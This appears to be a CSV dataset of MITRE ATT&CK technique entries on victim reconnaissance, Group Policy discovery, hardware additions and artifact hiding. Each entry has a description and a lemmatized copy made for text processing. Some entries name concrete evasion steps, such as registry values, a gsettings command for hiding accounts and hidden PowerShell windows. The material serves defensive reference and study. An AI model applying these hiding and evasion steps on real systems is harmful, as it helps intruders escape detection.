T1592.004,Gather Victim Host Information: Client Configurations,"Adversaries may gather information about the victim's client configurations that can be used during targeting. Information about client configurations may include a variety of details and settings, including operating system/version, virtualization, architecture (ex: 32 or 64 bit), language, and/or time zone.Adversaries may gather this information in various ways, such as direct collection actions via Active Scanning (ex: listening ports, server banners, user agent strings) or Phishing for Information. Adversaries may also compromise sites then include malicious content designed to collect host information from visitors. Information about the client configurations may also be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Websites/Domains or Search Open Technical Databases), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: Supply Chain Compromise or External Remote Services).",adversary gather information victim client configuration targeting information client configuration include variety detail setting include operating system version virtualization architecture ex bit language time zone adversary gather information way direct collection action active scanning ex listening port server banner user agent string phishe information adversary compromise site include malicious content design collect host information visitor information client configuration expose adversary online accessible data set ex job posting network map assessment report resume purchase invoice gather information reveal opportunity form reconnaissance ex search open websites domains search open technical databases establish operational resource ex develop capability obtain capability initial access ex supply chain compromise external remote service
T1589,Gather Victim Identity Information,"Adversaries may gather information about the victim's identity that can be used during targeting. Information about identities may include a variety of details, including personal data (ex: employee names, email addresses, etc.) as well as sensitive details such as credentials.Adversaries may gather this information in various ways, such as direct elicitation via Phishing for Information. Information about users could also be enumerated via other active means (i.e. Active Scanning) such as probing and analyzing responses from authentication services that may reveal valid usernames in a system.Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Websites/Domains or Phishing for Information), establishing operational resources (ex: Compromise Accounts), and/or initial access (ex: Phishing or Valid Accounts).",adversary gather information victim identity targeting information identity include variety detail include personal datum ex employee name email address etc sensitive detail credential adversary gather information way direct elicitation phishing information information user enumerate active mean active scanning probe analyze response authentication service reveal valid username system gather information reveal opportunity form reconnaissance ex search open websites domain phishe information establish operational resource ex compromise account initial access ex phishing valid account
T1589.001,Gather Victim Identity Information: Credentials,"Adversaries may gather credentials that can be used during targeting. Account credentials gathered by adversaries may be those directly associated with the target victim organization or attempt to take advantage of the tendency for users to use the same passwords across personal and business accounts.Adversaries may gather credentials from potential victims in various ways, such as direct elicitation via Phishing for Information. Adversaries may also compromise sites then add malicious content designed to collect website authentication cookies from visitors.Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Websites/Domains or Phishing for Information), establishing operational resources (ex: Compromise Accounts), and/or initial access (ex: External Remote Services or Valid Accounts).",adversary gather credential targeting account credential gather adversary directly associate target victim organization attempt advantage tendency user use password personal business account adversary gather credential potential victim way direct elicitation phishing information adversary compromise site add malicious content design collect website authentication cookie visitor gather information reveal opportunity form reconnaissance ex search open websites domain phishe information establish operational resource ex compromise account initial access ex external remote service valid account
T1589.002,Gather Victim Identity Information: Email Addresses,"Adversaries may gather email addresses that can be used during targeting. Even if internal instances exist, organizations may have public-facing email infrastructure and addresses for employees.Adversaries may easily gather email addresses, since they may be readily available and exposed via online or other accessible data sets (ex: Social Media or Search Victim-Owned Websites).Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Websites/Domains or Phishing for Information), establishing operational resources (ex: Email Accounts), and/or initial access (ex: Phishing or Brute Force via External Remote Services).",adversary gather email address targeting internal instance exist organization public face email infrastructure address employee adversary easily gather email address readily available expose online accessible data set ex social media search victim own information reveal opportunity form reconnaissance ex search open websites domain phishe information establish operational resource ex email account initial access ex phishing brute force external remote services
T1589.003,Gather Victim Identity Information: Employee Names,"Adversaries may gather employee names that can be used during targeting. Employee names be used to derive email addresses as well as to help guide other reconnaissance efforts and/or craft more-believable lures.Adversaries may easily gather employee names, since they may be readily available and exposed via online or other accessible data sets (ex: Social Media or Search Victim-Owned Websites). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Websites/Domains or Phishing for Information), establishing operational resources (ex: Compromise Accounts), and/or initial access (ex: Phishing or Valid Accounts).",adversary gather employee name targeting employee name derive email address help guide reconnaissance effort craft believable lur adversary easily gather employee name readily available expose online accessible data set ex social media search victim own websites gather information reveal opportunity form reconnaissance ex search open websites domains phishe information establish operational resource ex compromise account initial access ex phishing valid account
T1590,Gather Victim Network Information,"Adversaries may gather information about the victim's networks that can be used during targeting. Information about networks may include a variety of details, including administrative data (ex: IP ranges, domain names, etc.) as well as specifics regarding its topology and operations.Adversaries may gather this information in various ways, such as direct collection actions via Active Scanning or Phishing for Information. Information about networks may also be exposed to adversaries via online or other accessible data sets (ex: Search Open Technical Databases). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Active Scanning or Search Open Websites/Domains), establishing operational resources (ex: Acquire Infrastructure or Compromise Infrastructure), and/or initial access (ex: Trusted Relationship).",adversary gather information victim network targeting information network include variety detail include administrative datum ex ip range domain name etc specific topology operation adversary gather information way direct collection action active scanning phishing information information network expose adversary online accessible data set ex search open technical databases gather information reveal opportunity form reconnaissance ex active scanning search open websites domain establish operational resource ex acquire infrastructure compromise infrastructure initial access ex trusted relationship
T1590.001,Gather Victim Network Information: Domain Properties,"Adversaries may gather information about the victim's network domain(s) that can be used during targeting. Information about domains and their properties may include a variety of details, including what domain(s) the victim owns as well as administrative data (ex: name, registrar, etc.) and more directly actionable information such as contacts (email addresses and phone numbers), business addresses, and name servers.Adversaries may gather this information in various ways, such as direct collection actions via Active Scanning or Phishing for Information. Information about victim domains and their properties may also be exposed to adversaries via online or other accessible data sets (ex: WHOIS). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Technical Databases, Search Open Websites/Domains, or Phishing for Information), establishing operational resources (ex: Acquire Infrastructure or Compromise Infrastructure), and/or initial access (ex: Phishing).",adversary gather information victim network targeting information domain property include variety detail include victim own administrative datum ex registrar etc directly actionable information contact email address phone number business address server adversary gather information way direct collection action active scanning phishing information information victim domain property expose adversary online accessible data set ex whois gather information reveal opportunity form reconnaissance ex search open technical database search open websites domains phishe information establish operational resource ex acquire infrastructure compromise infrastructure initial access ex phishing
T1590.002,Gather Victim Network Information: DNS,"Adversaries may gather information about the victim's DNS that can be used during targeting. DNS information may include a variety of details, including registered name servers as well as records that outline addressing for a target’s subdomains, mail servers, and other hosts. DNS, MX, TXT, and SPF records may also reveal the use of third party cloud and SaaS providers, such as Office 365, G Suite, Salesforce, or Zendesk.Adversaries may gather this information in various ways, such as querying or otherwise collecting details via DNS/Passive DNS. DNS information may also be exposed to adversaries via online or other accessible data sets (ex: Search Open Technical Databases). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Technical Databases, Search Open Websites/Domains, or Active Scanning), establishing operational resources (ex: Acquire Infrastructure or Compromise Infrastructure), and/or initial access (ex: External Remote Services).",adversary gather information victim dns targeting dns information include variety detail include register server record outline addressing target subdomain mail server host dns mx txt spf record reveal use party cloud saas provider office g suite salesforce zendesk adversary gather information way query collect detail dns passive dns dns information expose adversary online accessible data set ex search open technical databases gather information reveal opportunity form reconnaissance ex search open technical databases search open websites domains active scanning establish operational resource ex acquire infrastructure compromise infrastructure initial access ex external remote services
T1590.003,Gather Victim Network Information: Network Trust Dependencies,"Adversaries may gather information about the victim's network trust dependencies that can be used during targeting. Information about network trusts may include a variety of details, including second or third-party organizations/domains (ex: managed service providers, contractors, etc.) that have connected (and potentially elevated) network access.Adversaries may gather this information in various ways, such as direct elicitation via Phishing for Information. Information about network trusts may also be exposed to adversaries via online or other accessible data sets (ex: Search Open Technical Databases). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Active Scanning or Search Open Websites/Domains), establishing operational resources (ex: Acquire Infrastructure or Compromise Infrastructure), and/or initial access (ex: Trusted Relationship).",adversary gather information victim network trust dependency targeting information network trust include variety detail include second party organization domain ex manage service provider contractor etc connect potentially elevate network access adversary gather information way direct elicitation phishing information information network trust expose adversary online accessible data set ex search open technical database gather information reveal opportunity form reconnaissance ex active scanning search open websites domain establish operational resource ex acquire infrastructure compromise infrastructure initial access ex trusted relationship
T1590.004,Gather Victim Network Information: Network Topology,"Adversaries may gather information about the victim's network topology that can be used during targeting. Information about network topologies may include a variety of details, including the physical and/or logical arrangement of both external-facing and internal network environments. This information may also include specifics regarding network devices (gateways, routers, etc.) and other infrastructure.Adversaries may gather this information in various ways, such as direct collection actions via Active Scanning or Phishing for Information. Information about network topologies may also be exposed to adversaries via online or other accessible data sets (ex: Search Victim-Owned Websites). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Technical Databases or Search Open Websites/Domains), establishing operational resources (ex: Acquire Infrastructure or Compromise Infrastructure), and/or initial access (ex: External Remote Services).",adversary gather information victim network topology targeting information network topology include variety detail include physical logical arrangement external face internal network environment information include specific network device gateway router etc infrastructure adversary gather information way direct collection action active scanning phishe information information network topology expose adversary online accessible data set ex search victim own websites gather information reveal opportunity form reconnaissance ex search open technical databases search open websites domains establish operational resource ex acquire infrastructure compromise infrastructure initial access ex external remote services
T1590.005,Gather Victim Network Information: IP Addresses,"Adversaries may gather the victim's IP addresses that can be used during targeting. Public IP addresses may be allocated to organizations by block, or a range of sequential addresses. Information about assigned IP addresses may include a variety of details, such as which IP addresses are in use. IP addresses may also enable an adversary to derive other details about a victim, such as organizational size, physical location(s), Internet service provider, and or where/how their publicly-facing infrastructure is hosted.Adversaries may gather this information in various ways, such as direct collection actions via Active Scanning or Phishing for Information. Information about assigned IP addresses may also be exposed to adversaries via online or other accessible data sets (ex: Search Open Technical Databases). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Active Scanning or Search Open Websites/Domains), establishing operational resources (ex: Acquire Infrastructure or Compromise Infrastructure), and/or initial access (ex: External Remote Services).",adversary gather victim ip address targeting public ip address allocate organization block range sequential address information assign ip address include variety detail ip address use ip address enable adversary derive detail victim organizational size physical internet service provider publicly face infrastructure host adversary gather information way direct collection action active scanning phishing information information assign ip address expose adversary online accessible data set ex search open technical databases gather information reveal opportunity form reconnaissance ex active scanning search open websites domains establish operational resource ex acquire infrastructure compromise infrastructure initial access ex external remote services
T1590.006,Gather Victim Network Information: Network Security Appliances,"Adversaries may gather information about the victim's network security appliances that can be used during targeting. Information about network security appliances may include a variety of details, such as the existence and specifics of deployed firewalls, content filters, and proxies/bastion hosts. Adversaries may also target information about victim network-based intrusion detection systems (NIDS) or other appliances related to defensive cybersecurity operations.Adversaries may gather this information in various ways, such as direct collection actions via Active Scanning or Phishing for Information. Information about network security appliances may also be exposed to adversaries via online or other accessible data sets (ex: Search Victim-Owned Websites). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Technical Databases or Search Open Websites/Domains), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: External Remote Services).",adversary gather information victim network security appliance targeting information network security appliance include variety detail existence specific deploy firewall content filter proxy bastion host adversary target information victim network base intrusion detection system nids appliance relate defensive cybersecurity operation adversary gather information way direct collection action active scanning phishing information information network security appliance expose adversary online accessible data set ex search victim own websites gather information reveal opportunity form reconnaissance ex search open technical databases search open websites domains establish operational resource ex develop capability obtain capability initial access ex external remote services
T1591,Gather Victim Org Information,"Adversaries may gather information about the victim's organization that can be used during targeting. Information about an organization may include a variety of details, including the names of divisions/departments, specifics of business operations, as well as the roles and responsibilities of key employees.Adversaries may gather this information in various ways, such as direct elicitation via Phishing for Information. Information about an organization may also be exposed to adversaries via online or other accessible data sets (ex: Social Media or Search Victim-Owned Websites). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Phishing for Information or Search Open Websites/Domains), establishing operational resources (ex: Establish Accounts or Compromise Accounts), and/or initial access (ex: Phishing or Trusted Relationship).",adversary gather information victim organization targeting information organization include variety detail include name division department specific business operation role responsibility key employee adversary gather information way direct elicitation phishing information information organization expose adversary online accessible data set ex social media search victim own website gather information reveal opportunity form reconnaissance ex phishe information search open website domain establish operational resource ex establish account compromise account initial access ex phishing trust relationship
T1591.001,Gather Victim Org Information: Determine Physical Locations,"Adversaries may gather the victim's physical location(s) that can be used during targeting. Information about physical locations of a target organization may include a variety of details, including where key resources and infrastructure are housed. Physical locations may also indicate what legal jurisdiction and/or authorities the victim operates within.Adversaries may gather this information in various ways, such as direct elicitation via Phishing for Information. Physical locations of a target organization may also be exposed to adversaries via online or other accessible data sets (ex: Search Victim-Owned Websites or Social Media). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Phishing for Information or Search Open Websites/Domains), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: Phishing or Hardware Additions).",adversary gather victim physical targeting information physical location target organization include variety detail include key resource infrastructure house physical location indicate legal jurisdiction authority victim operate adversary gather information way direct elicitation phishing information physical location target organization expose adversary online accessible data set ex search victim own website social media gather information reveal opportunity form reconnaissance ex phishe information search open websites domain establish operational resource ex develop capability obtain capability initial access ex phishing hardware addition
T1591.002,Gather Victim Org Information: Business Relationships,"Adversaries may gather information about the victim's business relationships that can be used during targeting. Information about an organization’s business relationships may include a variety of details, including second or third-party organizations/domains (ex: managed service providers, contractors, etc.) that have connected (and potentially elevated) network access. This information may also reveal supply chains and shipment paths for the victim’s hardware and software resources.Adversaries may gather this information in various ways, such as direct elicitation via Phishing for Information. Information about business relationships may also be exposed to adversaries via online or other accessible data sets (ex: Social Media or Search Victim-Owned Websites). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Phishing for Information or Search Open Websites/Domains), establishing operational resources (ex: Establish Accounts or Compromise Accounts), and/or initial access (ex: Supply Chain Compromise, Drive-by Compromise, or Trusted Relationship).",adversary gather information victim business relationship targeting information organization business relationship include variety detail include second party organization domain ex manage service provider contractor etc connect potentially elevate network access information reveal supply chain shipment path victim hardware software resource adversary gather information way direct elicitation phishing information information business relationship expose adversary online accessible data set ex social media search victim own website gather information reveal opportunity form reconnaissance ex phishe information search open websites domain establish operational resource ex establish account compromise account initial access ex supply chain compromise drive compromise trust relationship
T1591.003,Gather Victim Org Information: Identify Business Tempo,"Adversaries may gather information about the victim's business tempo that can be used during targeting. Information about an organization’s business tempo may include a variety of details, including operational hours/days of the week. This information may also reveal times/dates of purchases and shipments of the victim’s hardware and software resources.Adversaries may gather this information in various ways, such as direct elicitation via Phishing for Information. Information about business tempo may also be exposed to adversaries via online or other accessible data sets (ex: Social Media or Search Victim-Owned Websites). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Phishing for Information or Search Open Websites/Domains), establishing operational resources (ex: Establish Accounts or Compromise Accounts), and/or initial access (ex: Supply Chain Compromise or Trusted Relationship)",adversary gather information victim business tempo targeting information organization business tempo include variety detail include operational hour day week information reveal time date purchase shipment victim hardware software resource adversary gather information way direct elicitation phishing information information business tempo expose adversary online accessible data set ex social media search victim own website gather information reveal opportunity form reconnaissance ex phishe information search open website domain establish operational resource ex establish account compromise account initial access ex supply chain compromise trust relationship
T1591.004,Gather Victim Org Information: Identify Roles,"Adversaries may gather information about identities and roles within the victim organization that can be used during targeting. Information about business roles may reveal a variety of targetable details, including identifiable information for key personnel as well as what data/resources they have access to.Adversaries may gather this information in various ways, such as direct elicitation via Phishing for Information. Information about business roles may also be exposed to adversaries via online or other accessible data sets (ex: Social Media or Search Victim-Owned Websites). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Phishing for Information or Search Open Websites/Domains), establishing operational resources (ex: Establish Accounts or Compromise Accounts), and/or initial access (ex: Phishing).",adversary gather information identity role victim organization targeting information business role reveal variety targetable detail include identifiable information key personnel datum resource access adversary gather information way direct elicitation phishing information information business role expose adversary online accessible data set ex social media search victim own website gather information reveal opportunity form reconnaissance ex phishe information search open websites domain establish operational resource ex establish account compromise account initial access ex phishing
T1615,Group Policy Discovery,"Adversaries may gather information on Group Policy settings to identify paths for privilege escalation, security measures applied within a domain, and to discover patterns in domain objects that can be manipulated or used to blend in the environment. Group Policy allows for centralized management of user and computer settings in Active Directory (AD). Group policy objects (GPOs) are containers for group policy settings made up of files stored within a predictable network path \<DOMAIN>\SYSVOL\<DOMAIN>\Policies\.Adversaries may use commands such as gpresult or various publicly available PowerShell functions, such as Get-DomainGPO and Get-DomainGPOLocalGroup, to gather information on Group Policy settings. Adversaries may use this information to shape follow-on behaviors, including determining potential attack paths within the target network as well as opportunities to manipulate Group Policy settings (i.e. Domain Policy Modification) for their benefit.",adversary gather information group policy setting identify path privilege escalation security measure apply domain discover pattern domain object manipulate blend environment group policy allow centralized management user computer setting active directory ad group policy object gpos container group policy setting file store predictable network path use command gpresult publicly available powershell function domaingpo domaingpolocalgroup gather information group policy setting adversary use information shape follow behavior include determine potential attack path target network opportunity manipulate group policy setting domain policy modification benefit
T1200,Hardware Additions,"Adversaries may introduce computer accessories, networking hardware, or other computing devices into a system or network that can be used as a vector to gain access. Rather than just connecting and distributing payloads via removable storage (i.e. Replication Through Removable Media), more robust hardware additions can be used to introduce new functionalities and/or features into a system that can then be abused.While public references of usage by threat actors are scarce, many red teams/penetration testers leverage hardware additions for initial access. Commercial and open source products can be leveraged with capabilities such as passive network tapping, network traffic modification (i.e. Adversary-in-the-Middle), keystroke injection, kernel memory reading via DMA, addition of new wireless access to an existing network, and others.",adversary introduce computer accessory networking hardware compute device system network vector gain access connect distribute payload removable storage replication removable media robust hardware addition introduce new functionality feature system abuse public reference usage threat actor scarce red team penetration tester leverage hardware addition initial access commercial open source product leverage capability passive network tapping network traffic modification adversary middle keystroke injection kernel memory reading dma addition new wireless access exist network
T1564,Hide Artifacts,"Adversaries may attempt to hide artifacts associated with their behaviors to evade detection. Operating systems may have features to hide various artifacts, such as important system files and administrative task execution, to avoid disrupting user work environments and prevent users from changing files or features on the system. Adversaries may abuse these features to hide artifacts such as files, directories, user accounts, or other system activity to evade detection.Adversaries may also attempt to hide artifacts associated with malicious behavior by creating computing regions that are isolated from common security instrumentation, such as through the use of virtualization technology.",adversary attempt hide artifact associate behavior evade detection operate system feature hide artifact important system file administrative task execution avoid disrupt user work environment prevent user change file feature system adversary abuse feature hide artifact file directory user account system activity evade detection adversary attempt hide artifact associate malicious behavior create compute region isolate common security instrumentation use virtualization technology
T1564.001,Hide Artifacts: Hidden Files and Directories,"Adversaries may set files and directories to be hidden to evade detection mechanisms. To prevent normal users from accidentally changing special files on a system, most operating systems have the concept of a ‘hidden’ file. These files don’t show up when a user browses the file system with a GUI or when using normal commands on the command line. Users must explicitly ask to show the hidden files either via a series of Graphical User Interface (GUI) prompts or with command line switches (dir /a for Windows and ls –a for Linux and macOS).On Linux and Mac, users can mark specific files as hidden simply by putting a ""."" as the first character in the file or folder name . Files and folders that start with a period, ‘.’, are by default hidden from being viewed in the Finder application and standard command-line utilities like ""ls"". Users must specifically change settings to have these files viewable.Files on macOS can also be marked with the UF_HIDDEN flag which prevents them from being seen in Finder.app, but still allows them to be seen in Terminal.app . On Windows, users can mark specific files as hidden by using the attrib.exe binary. Many applications create these hidden files and folders to store information so that it doesn’t clutter up the user’s workspace. For example, SSH utilities create a .ssh folder that’s hidden and contains the user’s known hosts and keys.Adversaries can use this to their advantage to hide files and folders anywhere on the system and evading a typical user or system analysis that does not incorporate investigation of hidden files.",adversary set file directory hide evade detection mechanism prevent normal user accidentally change special file system operate system concept hidden file file user browse file system gui normal command command line user explicitly ask hide file series graphical user interface gui prompt command line switch dir windows ls linux linux mac user mark specific file hide simply put character file folder file folder start period default hide view finder application standard command line utility like ls user specifically change setting file viewable file macos mark flag prevent see allow see windows user mark specific file hide binary application create hide file folder store information clutter user workspace example ssh utility create folder hide contain user know host key adversary use advantage hide file folder system evade typical user system analysis incorporate investigation hidden file
T1564.002,Hide Artifacts: Hidden Users,"Adversaries may use hidden users to hide the presence of user accounts they create or modify. Administrators may want to hide users when there are many user accounts on a given system or if they want to hide their administrative or other management accounts from other users. In macOS, adversaries can create or modify a user to be hidden through manipulating plist files, folder attributes, and user attributes. To prevent a user from being shown on the login screen and in System Preferences, adversaries can set the userID to be under 500 and set the key value Hide500Users to TRUE in the /Library/Preferences/com.apple.loginwindow plist file. Adversaries may similarly hide user accounts in Windows. Adversaries can set the HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList Registry key value to 0 for a specific user to prevent that user from being listed on the logon screen.On Linux systems, adversaries may hide user accounts from the login screen, also referred to as the greeter. The method an adversary may use depends on which Display Manager the distribution is currently using. For example, on an Ubuntu system using the GNOME Display Manger (GDM), accounts may be hidden from the greeter using the gsettings command (ex: sudo -u gdm gsettings set org.gnome.login-screen disable-user-list true). Display Managers are not anchored to specific distributions and may be changed by a user or adversary.",adversary use hide user hide presence user account create modify administrator want hide user user account give system want hide administrative management account user macos adversary create modify user hide manipulate plist file folder attribute user attribute prevent user show login screen system preferences adversary set userid set key value true preference plist file adversary similarly hide user account windows adversary set registry key value specific user prevent user list logon screen linux system adversary hide user account login screen refer greeter method adversary use depend display manager distribution currently example ubuntu system gnome display manger gdm account hide greeter gsettings command ex sudo gdm gsetting set screen disable user list true display manager anchor specific distribution change user adversary
T1564.003,Hide Artifacts: Hidden Window,"Adversaries may use hidden windows to conceal malicious activity from the plain sight of users. In some cases, windows that would typically be displayed when an application carries out an operation can be hidden. This may be utilized by system administrators to avoid disrupting user work environments when carrying out administrative tasks. On Windows, there are a variety of features in scripting languages in Windows, such as PowerShell, Jscript, and Visual Basic to make windows hidden. One example of this is powershell.exe -WindowStyle Hidden. Similarly, on macOS the configurations for how applications run are listed in property list (plist) files. One of the tags in these files can be apple.awt.UIElement, which allows for Java applications to prevent the application's icon from appearing in the Dock. A common use for this is when applications run in the system tray, but don't also want to show up in the Dock.Adversaries may abuse these functionalities to hide otherwise visible windows from users so as not to alert the user to adversary activity on the system.",adversary use hide window conceal malicious activity plain sight user case window typically display application carry operation hide utilize system administrator avoid disrupt user work environment carry administrative task windows variety feature script language windows powershell jscript visual basic window hidden example hidden similarly macos configuration application run list property list plist file tag file uielement allow java application prevent application icon appear dock common use application run system tray want dock adversary abuse functionality hide visible window user alert user adversary activity system
T1564.004,Hide Artifacts: NTFS File Attributes,"Adversaries may use NTFS file attributes to hide their malicious data in order to evade detection. Every New Technology File System (NTFS) formatted partition contains a Master File Table (MFT) that maintains a record for every file/directory on the partition. Adversaries may store malicious data or binaries in file attribute metadata instead of directly in files. This may be done to evade some defenses, such as static indicator scanning tools and anti-virus.",adversary use ntfs file attribute hide malicious datum order evade detection new technology file system ntfs format partition contain master file table mft maintain record file directory partition adversary store malicious datum binary file attribute metadata instead directly file evade defense static indicator scanning tool anti virus
T1564.005,Hide Artifacts: Hidden File System,"Adversaries may use a hidden file system to conceal malicious activity from users and security tools. File systems provide a structure to store and access data from physical storage. Typically, a user engages with a file system through applications that allow them to access files and directories, which are an abstraction from their physical location (ex: disk sector). Standard file systems include FAT, NTFS, ext4, and APFS. File systems can also contain other structures, such as the Volume Boot Record (VBR) and Master File Table (MFT) in NTFS.Adversaries may use their own abstracted file system, separate from the standard file system present on the infected system. In doing so, adversaries can hide the presence of malicious components and file input/output from security tools. Hidden file systems, sometimes referred to as virtual file systems, can be implemented in numerous ways. One implementation would be to store a file system in reserved disk space unused by disk structures or standard file system partitions.",adversary use hide file system conceal malicious activity user security tool file system provide structure store access datum physical storage typically user engage file system application allow access file directory abstraction physical location ex disk sector standard file system include fat ntfs apfs file system contain structure volume boot record vbr master file table mft use abstract file system separate standard file system present infected system adversary hide presence malicious component file input output security tool hidden file system refer virtual file system implement numerous way implementation store file system reserve disk space unused disk structure standard file system partition
T1564.006,Hide Artifacts: Run Virtual Instance,"Adversaries may carry out malicious operations using a virtual instance to avoid detection. A wide variety of virtualization technologies exist that allow for the emulation of a computer or computing environment. By running malicious code inside of a virtual instance, adversaries can hide artifacts associated with their behavior from security tools that are unable to monitor activity inside the virtual instance. Additionally, depending on the virtual networking implementation (ex: bridged adapter), network traffic generated by the virtual instance can be difficult to trace back to the compromised host as the IP address and hostname might not match known values.Adversaries may utilize native support for virtualization (ex: Hyper-V) or drop the necessary files to run a virtual instance (ex: VirtualBox binaries). After running a virtual instance, adversaries may create a shared folder between the guest and host with permissions that enable the virtual instance to interact with the host file system.",adversary carry malicious operation virtual instance avoid detection wide variety virtualization technology exist allow emulation computer computing environment run malicious code inside virtual instance adversary hide artifact associate behavior security tool unable monitor activity inside virtual instance additionally depend virtual networking implementation ex bridged adapter network traffic generate virtual instance difficult trace compromise host ip address hostname match know value adversary utilize native support virtualization ex hyper v drop necessary file run virtual instance ex virtualbox binary run virtual instance adversary create share folder guest host permission enable virtual instance interact host file system
T1564.007,Hide Artifacts: VBA Stomping,"Adversaries may hide malicious Visual Basic for Applications (VBA) payloads embedded within MS Office documents by replacing the VBA source code with benign data.MS Office documents with embedded VBA content store source code inside of module streams. Each module stream has a PerformanceCache that stores a separate compiled version of the VBA source code known as p-code. The p-code is executed when the MS Office version specified in the _VBA_PROJECT stream (which contains the version-dependent description of the VBA project) matches the version of the host MS Office application.An adversary may hide malicious VBA code by overwriting the VBA source code location with zero’s, benign code, or random bytes while leaving the previously compiled malicious p-code. Tools that scan for malicious VBA source code may be bypassed as the unwanted code is hidden in the compiled p-code. If the VBA source code is removed, some tools might even think that there are no macros present. If there is a version match between the _VBA_PROJECT stream and host MS Office application, the p-code will be executed, otherwise the benign VBA source code will be decompressed and recompiled to p-code, thus removing malicious p-code and potentially bypassing dynamic analysis.",adversary hide malicious visual basic applications vba payload embed ms office document replace vba source code benign datum ms office document embed vba content store source code inside module stream module stream performancecache store separate compile version vba source code know p code p code execute ms office version specify stream contain version dependent description vba project match version host ms office application adversary hide malicious vba code overwrite vba source code location zero benign code random byte leave previously compile malicious p code tool scan malicious vba source code bypass unwanted code hide compile p code vba source code remove tool think macro present version match stream host ms office application p code execute benign vba source code decompress recompile p code remove malicious p code potentially bypass dynamic analysis
T1564.008,Hide Artifacts: Email Hiding Rules,"Adversaries may use email rules to hide inbound emails in a compromised user's mailbox. Many email clients allow users to create inbox rules for various email functions, including moving emails to other folders, marking emails as read, or deleting emails. Rules may be created or modified within email clients or through external features such as the New-InboxRule or Set-InboxRule PowerShell cmdlets on Windows systems.Adversaries may utilize email rules within a compromised user's mailbox to delete and/or move emails to less noticeable folders. Adversaries may do this to hide security alerts, C2 communication, or responses to Internal Spearphishing emails sent from the compromised account.Any user or administrator within the organization (or adversary with valid credentials) may be able to create rules to automatically move or delete emails. These rules can be abused to impair/delay detection had the email content been immediately seen by a user or defender. Malicious rules commonly filter out emails based on key words (such as malware, suspicious, phish, and hack) found in message bodies and subject lines. In some environments, administrators may be able to enable email rules that operate organization-wide rather than on individual inboxes. For example, Microsoft Exchange supports transport rules that evaluate all mail an organization receives against user-specified conditions, then performs a user-specified action on mail that adheres to those conditions. Adversaries that abuse such features may be able to automatically modify or delete all emails related to specific topics (such as internal security incident notifications).",adversary use email rule hide inbound email compromised user mailbox email client allow user create inbox rule email function include move email folder mark email read delete email rule create modify email client external feature new inboxrule set inboxrule powershell cmdlet windows system adversary utilize email rule compromise user mailbox delete email noticeable folder adversary hide security alert communication response internal spearphishing email send compromised account user administrator organization adversary valid credential able create rule automatically delete email rule abuse impair delay detection email content immediately see user defender malicious rule commonly filter email base key word malware suspicious phish hack find message body subject line environment administrator able enable email rule operate organization wide individual inboxe example microsoft exchange support transport rule evaluate mail organization receive user specify condition perform user specify action mail adhere condition adversary abuse feature able automatically modify delete email relate specific topic internal security incident notification
T1564.009,Hide Artifacts: Resource Forking,"Adversaries may abuse resource forks to hide malicious code or executables to evade detection and bypass security applications. A resource fork provides applications a structured way to store resources such as thumbnail images, menu definitions, icons, dialog boxes, and code.Adversaries can use resource forks to hide malicious data that may otherwise be stored directly in files. Adversaries can execute content with an attached resource fork, at a specified offset, that is moved to an executable location then invoked. Resource fork content may also be obfuscated/encrypted until execution.",adversary abuse resource fork hide malicious code executable evade detection bypass security application resource fork provide application structured way store resource thumbnail image menu definition icon dialog box code adversary use resource fork hide malicious datum store directly file adversary execute content attach resource fork specify offset move executable location invoke resource fork content obfuscate encrypt execution
T1564.010,Hide Artifacts: Process Argument Spoofing,"Adversaries may attempt to hide process command-line arguments by overwriting process memory. Process command-line arguments are stored in the process environment block (PEB), a data structure used by Windows to store various information about/used by a process. The PEB includes the process command-line arguments that are referenced when executing the process. When a process is created, defensive tools/sensors that monitor process creations may retrieve the process arguments from the PEB.Adversaries may manipulate a process PEB to evade defenses. For example, Process Hollowing can be abused to spawn a process in a suspended state with benign arguments. After the process is spawned and the PEB is initialized (and process information is potentially logged by tools/sensors), adversaries may override the PEB to modify the command-line arguments (ex: using the Native API WriteProcessMemory() function) then resume process execution with malicious arguments.Adversaries may also execute a process with malicious command-line arguments then patch the memory with benign arguments that may bypass subsequent process memory analysis.This behavior may also be combined with other tricks (such as Parent PID Spoofing) to manipulate or further evade process-based detections.",adversary attempt hide process command line argument overwrite process memory process command line argument store process environment block peb data structure windows store information process peb include process command line argument reference execute process process create defensive tool sensor monitor process creation retrieve process argument manipulate process peb evade defense example process hollowing abuse spawn process suspend state benign argument process spawn peb initialize process information potentially log tool sensor adversary override peb modify command line argument ex native api writeprocessmemory function resume process execution malicious argument adversary execute process malicious command line argument patch memory benign argument bypass subsequent process memory analysis behavior combine trick parent pid spoofing manipulate evade process base detection
